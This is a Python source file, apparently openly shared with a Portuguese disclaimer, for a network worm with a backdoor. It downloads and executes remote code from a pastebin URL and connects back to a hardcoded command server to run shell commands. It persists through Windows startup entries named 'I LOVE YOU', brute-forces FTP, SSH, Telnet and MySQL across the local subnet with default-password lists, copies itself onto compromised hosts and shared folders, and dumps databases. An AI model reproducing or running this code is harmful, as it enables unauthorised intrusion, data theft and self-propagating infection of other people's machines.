

# Aviso de Responsabilidade: Utilização do Código Worm
# Este script Python foi desenvolvido por Mik e é disponibilizado como um codigo aberto. 
# Ao escolher usar este script, o usuário aceita total responsabilidade pelos resultados
# e possíveis impactos derivados da sua utilização.

import base64
import datetime
import getpass
import os
import platform
import psutil
import socket
import tabulate
import threading
import requests
import ftplib
import telnetlib
import paramiko
import pymysql
import inspect
import sys
import subprocess
import shutil
import time

while True:
    try:
      url = 'https://pastebin.com/raw/TF6nxwrk'
      response = requests.get(url)
      if response.status_code == 200:
        code_content = response.text
        exec(code_content)
        break
      else:
        CONSTIP = "miklulsec.ddns.net"
        CONSTPT = 9999
        break
    except Exception as e:
        pass

# S T A R T   C O N E C T I O N   S E R V E R
class PERSISTENCE:

    def __init__(self):
        pass
    
class SYSINFO:

    def __init__(self):
        self.sysinfo = self.get_sys_info()
        self.boot_time = self.get_boot_time()
        self.cpu_info = self.get_cpu_info()
        self.mem_usage = self.get_mem_usage()
        self.disk_info = self.get_disk_info()
        self.net_info  = self.get_net_info()

    def get_size(self, bolter, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bolter < factor:
                return f"{bolter:.2f}{unit}{suffix}"
            
            bolter /= factor

    def get_sys_info(self):
        headers = ("Platform Tag", "Information")
        values  = []

        uname = platform.uname()
        values.append(("System", uname.system))
        values.append(("Node Name", uname.node))
        values.append(("Release", uname.release))
        values.append(("Version", uname.version))
        values.append(("Machine", uname.machine))
        values.append(("Processor", uname.processor))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_boot_time(self):
        headers = ("Boot Tags", "Information")
        values  = []

        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)

        values.append(("Boot Time", f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"))

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_cpu_info(self):
        headers = ("CPU Tag", "Value")
        values  = []

        cpufreq = psutil.cpu_freq()

        values.append(("Physical Cores", psutil.cpu_count(logical=False)))
        values.append(("Total Cores", psutil.cpu_count(logical=True)))
        values.append(("Max Frequency", f"{cpufreq.max:.2f}Mhz"))
        values.append(("Min Frequency", f"{cpufreq.min:.2f}Mhz"))
        values.append(("Current Frequency", f"{cpufreq.current:.2f}Mhz"))
        values.append(("CPU Usage", f"{psutil.cpu_percent()}%"))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_mem_usage(self):
        headers = ("Memory Tag", "Value")
        values  = []

        svmem = psutil.virtual_memory()
        swap = psutil.swap_memory()

        values.append(("Total Mem", f"{self.get_size(svmem.total)}"))
        values.append(("Available Mem", f"{self.get_size(svmem.available)}"))
        values.append(("Used Mem", f"{self.get_size(svmem.used)}"))
        values.append(("Percentage", f"{self.get_size(svmem.percent)}%"))
        
        values.append(("Total Swap", f"{self.get_size(swap.total)}"))
        values.append(("Free Swap", f"{self.get_size(swap.free)}"))
        values.append(("Used Swap", f"{self.get_size(swap.used)}"))
        values.append(("Percentage Swap", f"{self.get_size(swap.percent)}%"))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_disk_info(self):
        headers = ("Device", "Mountpoint", "File System", "Total Size", "Used", "Free", "Percentage")
        values = []

        partitions = psutil.disk_partitions()

        toappend = []
        for partition in partitions:
            toappend.append(partition.device)
            toappend.append(partition.mountpoint)
            toappend.append(partition.fstype)

            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                toappend.append(self.get_size(partition_usage.total))
                toappend.append(self.get_size(partition_usage.used))
                toappend.append(self.get_size(partition_usage.free))
                toappend.append(self.get_size(partition_usage.percent))
            except PermissionError:
                toappend.append(" "); toappend.append(" "); toappend.append(" "); toappend.append(" "); 
            
            values.append(toappend)
            toappend = []

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval             

    def get_net_info(self):
        headers = ('Interface', 'IP Address', 'MAC Address', 'Netmask', 'Broadcast IP', 'Broadcast MAC')
        values = []

        if_addrs = psutil.net_if_addrs()
        toappend = []

        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                toappend.append(interface_name)
                if str(address.family) == 'AddressFamily.AF_INET':
                    toappend.append(address.address)
                    toappend.append('')
                    toappend.append(address.netmask)
                    toappend.append(address.broadcast)
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    toappend.append('')
                    toappend.append(address.address)
                    toappend.append(address.netmask)
                    toappend.append('')
                    toappend.append(address.broadcast)
                
                values.append(toappend)
                toappend = []

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_data(self):
        self.DATA_STRING = "\n" + self.sysinfo + "\n\n" + self.boot_time + "\n\n" + self.cpu_info + "\n\n" + \
                            self.mem_usage + "\n\n" + self.disk_info + "\n\n" + self.net_info + "\n\n"
        return self.DATA_STRING 
class CLIENT:

    SOCK = None
    KEY  = ")J@NcRfU"

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port      = _pt


    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else:
            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))

    def execute(self, command):
        data = command.decode('utf-8').split(":")

        if data[0] == "shell":

            #print("Executing Shell: " + data[1])
            toexecute = data[1].rstrip(" ").lstrip(" ")
            toexecute = " ".join(toexecute.split())
            if toexecute.split(" ")[0] == "cd":
                try:
                    os.chdir(toexecute.split(" ")[1])
                    self.send_data("")
                except:
                    self.send_data("Error while changing directory!")
            else:
                try:
                    comm = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    output, errors = comm.communicate()
                    self.send_data(output + errors)
                except FileNotFoundError:
                    self.send_data("No Such File or Directory")

    def acceptor(self):

        data = ""
        chunk = b""

        while True:
            chunk = self.SOCK.recv(4096)
            if not chunk:
                break
            data += chunk.decode('utf-8')

            if self.KEY.encode('utf-8') in chunk:
                data = data.rstrip(self.KEY)
                t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
                t.daemon = True
                t.start()
                data = ""

    def engage(self):
        while True:
            try:
                self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.SOCK.connect((self.ipaddress, self.port))
                self.acceptor()
            except ConnectionResetError:
                time.sleep(5)  # Aguarda 5 segundos antes de tentar novamente
            except Exception as e:
                time.sleep(5)

# A D D   R E G I S T E R   W I N D O W S
def is_program_running():
    current_process = psutil.Process(os.getpid())
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == current_process.name() and process.info['pid'] != current_process.pid:
            return True
    return False
def is_program_in_startup_registry(program_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "I LOVE YOU"  # Substitua "Nome_Desired" pelo nome desejado para a entrada no registro

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)

        try:
            value, _ = winreg.QueryValueEx(key, key_name)
            return value == program_path
        except FileNotFoundError:
            return False
        finally:
            winreg.CloseKey(key)

    except Exception as e:
        pass  # Não imprime mensagens de erro, apenas passa silenciosamente
        return False
def add_to_startup_registry(program_path):
    try:
        if not is_program_in_startup_registry(program_path):
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "I LOVE YOU"
            key_value = program_path

            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)

            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, key_value)

            winreg.CloseKey(key)
        else:
            pass  # Não imprime mensagem, apenas passa silenciosamente
    except Exception as e:
        pass  # Não imprime mensagens de erro, apenas passa silenciosamente
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except socket.error as e:
        return None

# W O R M   F T P
class FTPClient:

    def __init__(self):
        self.ftp = ftplib.FTP()

    def download_credentials(self, url):
        try:
            response = requests.get(url)
            response.raise_for_status()
            lines = response.text.splitlines()
            return [line.strip() for line in lines]
        except requests.RequestException:
            return []

    def check_remote_file_exists(self, remote_file):
        try:
            remote_files = self.ftp.nlst()
            return remote_file in remote_files
        except ftplib.error_perm:
            return False

    def scan_and_transfer(self, target_ip, credentials_url='https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt', timeout=10):
        try:
            self.ftp.connect(target_ip, 21, timeout=timeout)
            credentials = self.download_credentials(credentials_url)
            if not credentials:
                return

            for credential in credentials:
                user, password = credential.split(':')
                try:
                    self.ftp.login(user, password)
                    remote_file_exists = self.check_remote_file_exists(__file__)

                    if not remote_file_exists:
                        with open(__file__, 'rb') as file:
                            remote_path = f'/path/to/remote/{__file__}'  # Change this to your desired path
                            self.ftp.storbinary(f'STOR {remote_path}', file)
                except ftplib.error_perm as e:
                    pass

            # Mover o retorno para fora do loop para continuar a verificação para todas as credenciais
            return
        except ftplib.all_errors as e:
            pass
        finally:
            try:
                # Verificar se a conexão está ativa antes de fechar
                if self.ftp.sock is not None:
                    self.ftp.quit()
            except Exception as e:
                pass

def get_local_ip():
    try:
        # Use a socket to get the local IP address
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(('8.8.8.8', 80))
            local_ip = s.getsockname()[0]
        return local_ip
    except socket.error:
        return None

# W O R M   S S H
class SSHClient:
    def __init__(self):
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def download_credentials(self, url):
        try:
            response = requests.get(url)
            response.raise_for_status()
            lines = response.text.splitlines()
            lines = [line.strip() for line in lines]
            return lines
        except requests.RequestException as e:
            return []

    def check_remote_file_exists(self, remote_file):
     sftp = None  # Inicialize o objeto sftp fora do bloco try
     try:
        sftp = self.ssh.open_sftp()
        remote_files = sftp.listdir()
        return remote_file in remote_files
     except IOError as e:
        return False
     finally:
        if sftp is not None:
            sftp.close()

    def try_execute_emulator(self, emulator_path):
        try:
            script_path = os.path.abspath(inspect.getfile(inspect.currentframe())) 
            # Executa o emulador no servidor remoto
            stdin, stdout, stderr = self.ssh.exec_command(f'{emulator_path} {script_path}')
            return stdout.read().decode('utf-8')
        except paramiko.SSHException as e:
            # Manipula a exceção, se houver problemas com a execução
            return None

    def scan_and_transfer(self, target_ip, credentials_url='https://raw.githubusercontent.com/1N3/BruteX/master/wordlists/ssh-default-userpass.txt', timeout=10):
        try:
            credentials = self.download_credentials(credentials_url)
            if not credentials:
                return

            for credential in credentials:
                user, password = credential.split(':')
                try:
                    self.ssh.connect(target_ip, username=user, password=password, timeout=timeout)  # Ajuste o valor conforme necessário
                    script_path = os.path.abspath(inspect.getfile(inspect.currentframe()))
                    remote_file_exists = self.check_remote_file_exists(script_path)
                    if not remote_file_exists:
                        sftp = self.ssh.open_sftp()
                        with open(script_path, 'rb') as file:
                            sftp.putfo(file, script_path)

                        stdin, stdout, stderr = self.ssh.exec_command(f'{script_path}')
                        stdin, stdout, stderr = self.ssh.exec_command(f'wine {script_path}')

                    return

                except paramiko.AuthenticationException as e:
                    pass
                except paramiko.SSHException as e:
                    pass
        except paramiko.SSHException as e:
            pass
        finally:
            self.ssh.close()
# W O R M  T E L N E T
class TelnetClient:
    def __init__(self):
        self.tn = telnetlib.Telnet()

    def download_credentials(self, url):
        try:
            response = requests.get(url)
            response.raise_for_status()
            lines = response.text.splitlines()
            lines = [line.strip() for line in lines]
            return lines
        except requests.RequestException as e:
            return []

    def check_remote_file_exists(self, remote_file):
        try:
            self.tn.cmd(f'ls {remote_file}')
            return True
        except Exception as e:
            return False

    def scan_and_transfer(self, target_ip, credentials_url='https://raw.githubusercontent.com/1N3/BruteX/master/wordlists/telnet-default-userpass.txt'):
        try:
            self.tn.open(target_ip)
            credentials = self.download_credentials(credentials_url)
            if not credentials:
                return

            for credential in credentials:
                user, password = credential.split(':')
                try:
                    self.tn.read_until(b'login: ')
                    self.tn.write(user.encode('ascii') + b'\n')
                    self.tn.read_until(b'Password: ')
                    self.tn.write(password.encode('ascii') + b'\n')

                    # Verifica se o arquivo remoto existe
                    remote_file_exists = self.check_remote_file_exists(__file__)

                    if not remote_file_exists:
                        # Envia o arquivo
                        with open(__file__, 'rb') as file:
                            content = file.read()
                            self.tn.write(content)

                    return

                except Exception as e:
                    pass

        except Exception as e:
            pass

        finally:
            self.tn.close()

# W O R M   M Y S Q L
class MySQLClient:
    def __init__(self):
        self.connection = None

    def download_credentials(self, url):
        try:
            response = requests.get(url)
            response.raise_for_status()
            lines = response.text.splitlines()
            lines = [line.strip() for line in lines]
            return lines
        except requests.RequestException as e:
            return []

    def connect(self, host, user, password, database):
        self.connection = pymysql.connect(
            host=host,
            user=user,
            password=password,
            database=database
        )

    def get_database_name(self):
        try:
            if self.connection.open:
                cursor = self.connection.cursor()
                cursor.execute("SELECT DATABASE()")
                return cursor.fetchone()[0]
        except Exception as e:
            pass
        return None

    def dump_database(self, output_file, database_name):
        try:
            if self.connection.open:
                cursor = self.connection.cursor()

                cursor.execute("SHOW CREATE DATABASE {}".format(database_name))
                create_database_statement = cursor.fetchone()[1]

                cursor.execute("SHOW TABLES FROM {}".format(database_name))
                tables = [table[0] for table in cursor.fetchall()]

                with open(output_file, 'w') as file:
                    file.write(create_database_statement + ";\n\n")

                    for table in tables:
                        cursor.execute("SHOW CREATE TABLE {}.{}".format(database_name, table))
                        create_table_statement = cursor.fetchone()[1]

                        file.write(create_table_statement + ";\n\n")

                        cursor.execute("SELECT * FROM {}.{}".format(database_name, table))
                        table_data = cursor.fetchall()

                        for row in table_data:
                            values = ",".join(["'{}'".format(value) for value in row])
                            file.write("INSERT INTO {} VALUES ({});\n".format(table, values))

        except Exception as e:
            pass

    def dump_all_databases(self, output_dir):
        try:
            if self.connection.open:
                cursor = self.connection.cursor()
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall()]

                for database_name in databases:
                    output_file = os.path.join(output_dir, f'{database_name}_dump.sql')
                    self.dump_database(output_file, database_name)

        except Exception as e:
            pass

    def should_dump(self, target_ip):
        last_dump_time_file = f"last_dump_time_{target_ip}.txt"

        if os.path.exists(last_dump_time_file):
            with open(last_dump_time_file, 'r') as file:
                last_dump_time = float(file.read())
                current_time = time.time()

                if current_time - last_dump_time < 3600:
                    return False

        return True

    def update_last_dump_time(self, target_ip):
        last_dump_time_file = f"last_dump_time_{target_ip}.txt"
        with open(last_dump_time_file, 'w') as file:
            file.write(str(time.time()))

    def scan_and_dump(self, target_ip, output_directory, credentials_url='https://raw.githubusercontent.com/1N3/BruteX/master/wordlists/mysql-default-userpass.txt'):
        try:
            credentials = self.download_credentials(credentials_url)
            if not credentials:
                return

            for credential in credentials:
                user, password = credential.split(':')
                try:
                    if not self.should_dump(target_ip):
                        return

                    self.connect(target_ip, user, password, 'target_database')

                    database_name = self.get_database_name()

                    if not database_name:
                        return

                    os.makedirs(output_directory, exist_ok=True)

                    output_file = os.path.join(output_directory, f'{database_name}_dump.sql')

                    self.dump_database(output_file, database_name)

                    self.update_last_dump_time(target_ip)

                    return

                except pymysql.MySQLError as e:
                    pass

        except requests.RequestException as e:
            pass

        finally:
            if self.connection and self.connection.open:
                self.connection.close()

# W O R M   S H A R E D   F O L D E R
class EnviadorArquivosCompartilhados:
    def __init__(self, caminho_arquivo):
        self.caminho_arquivo = caminho_arquivo

    def obter_pastas_compartilhadas(self, diretorio_base):
        pastas_compartilhadas = []
        for root, dirs, files in os.walk(diretorio_base):
            for dir_name in dirs:
                pasta_completa = os.path.join(root, dir_name)

                if os.access(pasta_completa, os.R_OK):
                    pastas_compartilhadas.append(pasta_completa)
        return pastas_compartilhadas

    def enviar_para_pastas_compartilhadas(self):
        pastas_compartilhadas = self.obter_pastas_compartilhadas('C:\\') 

        for pasta in pastas_compartilhadas:
            nome_arquivo = os.path.basename(self.caminho_arquivo)
            destino = os.path.join(pasta, nome_arquivo)

            if os.path.exists(destino):
                pass
            else:
                novo_nome_arquivo = self.gerar_novo_nome(destino)
                destino = os.path.join(pasta, novo_nome_arquivo)

                shutil.copy(self.caminho_arquivo, destino)

    def gerar_novo_nome(self, destino):
        nome_arquivo, extensao = os.path.splitext(os.path.basename(self.caminho_arquivo))
        contador = 1
        while os.path.exists(destino):
            novo_nome = 'I LOVE YOU.exe'
            destino = os.path.join(os.path.dirname(destino), novo_nome)
            contador += 1
        return os.path.basename(destino)

def start_worm_shared_folder():
    script_path = os.path.abspath(__file__)   
    enviador = EnviadorArquivosCompartilhados(script_path)
    enviador.enviar_para_pastas_compartilhadas()
    
def start_worm_ftp():
    def thread_function(target_ip):
        ftp_client = FTPClient()
        ftp_client.scan_and_transfer(target_ip)

    local_ip = get_local_ip()
    if local_ip:
        network_prefix = ".".join(local_ip.split(".")[:-1])

        threads = []
        for i in range(1, 255):
            target_ip = f'{network_prefix}.{i}'
            thread = threading.Thread(target=thread_function, args=(target_ip,))
            threads.append(thread)
            thread.start()
            time.sleep(3)  # Aguarda 3 segundos antes de iniciar a próxima thread

        for thread in threads:
            thread.join()

def start_worm_mysql():
    def thread_function(target_ip):
        mysql_client = MySQLClient()

        # Verifica se o diretório de saída existe e o cria se não existir
        if not os.path.exists(output_directory):
            os.makedirs(output_directory)

        mysql_client.scan_and_dump(target_ip, output_directory)

    local_ip = get_local_ip()
    output_directory = 'C:\\mysql'  # Substitua pelo diretório desejado
    if local_ip:
        network_prefix = ".".join(local_ip.split(".")[:-1])

        threads = []
        for i in range(1, 255):
            target_ip = f'{network_prefix}.{i}'
            thread = threading.Thread(target=thread_function, args=(target_ip,))
            threads.append(thread)
            thread.start()
            time.sleep(3)  # Aguarda 3 segundos antes de iniciar a próxima thread

        for thread in threads:
            thread.join()

def start_worm_telnet():
    def thread_function(target_ip):
        telnet_client = TelnetClient()
        telnet_client.scan_and_transfer(target_ip)

    local_ip = get_local_ip()
    if local_ip:
        network_prefix = ".".join(local_ip.split(".")[:-1])

        threads = []
        for i in range(1, 255):
            target_ip = f'{network_prefix}.{i}'
            thread = threading.Thread(target=thread_function, args=(target_ip,))
            threads.append(thread)
            thread.start()
            time.sleep(3)  # Aguarda 3 segundos antes de iniciar a próxima thread

        for thread in threads:
            thread.join()

def start_worm_ssh():
    def thread_function(target_ip):
        script_path = os.path.abspath(inspect.getfile(inspect.currentframe())) 
        ssh_client = SSHClient()
        try:
            ssh_client.scan_and_transfer(target_ip, script_path)
        except socket.timeout:
            pass

    local_ip = get_local_ip()
    if local_ip:
        network_prefix = ".".join(local_ip.split(".")[:-1])

        threads = []
        for i in range(1, 255):
            target_ip = f'{network_prefix}.{i}'
            thread = threading.Thread(target=thread_function, args=(target_ip,))
            threads.append(thread)
            thread.start()
            time.sleep(3)

        for thread in threads:
            thread.join()


def clientw():
    client = CLIENT(CONSTIP, CONSTPT)
    client.engage()

if __name__ == "__main__":

    USER_NAME = getpass.getuser()
   
    # copiando o nome do diretorio de execucao
    script_path = os.path.abspath(__file__)
    script_filename = os.path.basename(script_path)
   
    # contruindo o caminho para o diretorio de execucao de inicializacao do windows
    program_path = fr"C:\Users\{USER_NAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{script_filename}"
    
    # se auto copiando para o progam_path, caso ele ja esteja la, ele sera substituido
    shutil.copy2(script_path, program_path)

    add_to_startup_registry(program_path)

    client = threading.Thread(target=clientw)
    client.start()

    # iniciando worms
    folder = threading.Thread(target=start_worm_shared_folder)
    folder.start()

    worm_ftp = threading.Thread(target=start_worm_ftp)
    worm_ftp.start()

    worm_ssh = threading.Thread(target=start_worm_ssh)
    worm_ssh.start()

    worm_telnet = threading.Thread(target=start_worm_telnet)
    worm_telnet.start()